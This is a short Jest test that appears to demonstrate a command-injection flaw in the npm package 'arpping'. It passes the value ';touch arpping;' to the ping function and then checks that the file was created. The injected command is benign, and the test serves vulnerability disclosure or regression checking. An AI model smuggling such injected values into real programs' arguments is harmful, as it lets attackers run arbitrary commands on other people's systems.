test("Remote code execution in arpping", () => {
  expect.assertions(2);
  const Arpping = require("arpping");
  const fs = require("fs");
  const path = "./arpping";
  let arpping = new Arpping();
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return arpping
    .ping([";touch arpping;"])
    .then(() => {})
    .catch((err) => console.log(err))
    .finally(() => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
});
